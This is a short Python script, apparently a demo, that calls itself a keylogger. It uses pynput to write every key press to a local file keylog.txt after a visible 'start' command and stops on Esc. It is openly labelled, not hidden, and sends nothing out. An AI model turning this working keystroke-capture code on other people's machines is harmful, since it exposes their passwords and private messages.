from pynput import keyboard

is_logging = False

def on_press(key):
    try:
        with open("keylog.txt", "a") as f:
            f.write(f"{key.char}\n") 
    except AttributeError:
        with open("keylog.txt", "a") as f:
            f.write(f"{key}\n") 

def on_release(key):
    if key == keyboard.Key.esc: 
        return False  
def start_logging():
    global is_logging
    is_logging = True
    print("Logging started. Press 'Esc' to stop.")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    stop_logging()

def stop_logging():
    global is_logging
    if is_logging:
        is_logging = False
        print("Logging stopped.")

def main():
    print("Welcome to the Keylogger")
    print("Type 'start' to begin logging keystrokes.")
    print("Type 'stop' to end logging.")
    print("Type 'exit' to quit the program.")
    
    while True:
        command = input("\nEnter command: ").strip().lower()
        
        if command == 'start':
            if not is_logging:
                start_logging()
            else:
                print("Logging is already in progress.")
        elif command == 'stop':
            if is_logging:
                stop_logging()
            else:
                print("Logging is not in progress.")
        elif command == 'exit':
            print("Exiting the program.")
            break
        else:
            print("Invalid command. Please type 'start', 'stop', or 'exit'.")

if __name__ == "__main__":
    main()
